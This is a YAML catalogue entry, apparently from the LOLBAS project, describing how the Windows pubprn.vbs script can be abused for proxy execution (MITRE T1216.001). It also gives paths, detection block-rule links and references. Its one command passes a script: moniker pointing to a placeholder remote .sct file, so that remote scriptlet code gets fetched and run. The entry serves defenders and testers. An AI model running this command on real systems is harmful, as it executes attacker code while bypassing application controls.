---
Name: Pubprn.vbs
Description:
Author: 'Oddvar Moe'
Created: 2018-05-25
Commands:
  - Command: pubprn.vbs 127.0.0.1 script:https://domain.com/folder/file.sct
    Description: Set the 2nd variable with a Script COM moniker to perform Windows Script Host (WSH) Injection
    Usecase: Proxy execution
    Category: Execute
    Privileges: User
    MitreID: T1216.001
    OperatingSystem: Windows 10
Full_Path:
  - Path: C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs
  - Path: C:\Windows\SysWOW64\Printing_Admin_Scripts\en-US\pubprn.vbs
Code_Sample:
  - Code: https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSScripts/Payload/Pubprn_calc.sct
Detection:
  - BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
Resources:
  - Link: https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/
  - Link: https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology
  - Link: https://github.com/enigma0x3/windows-operating-system-archaeology
Acknowledgement:
  - Person: Matt Nelson
    Handle: '@enigma0x3'
---
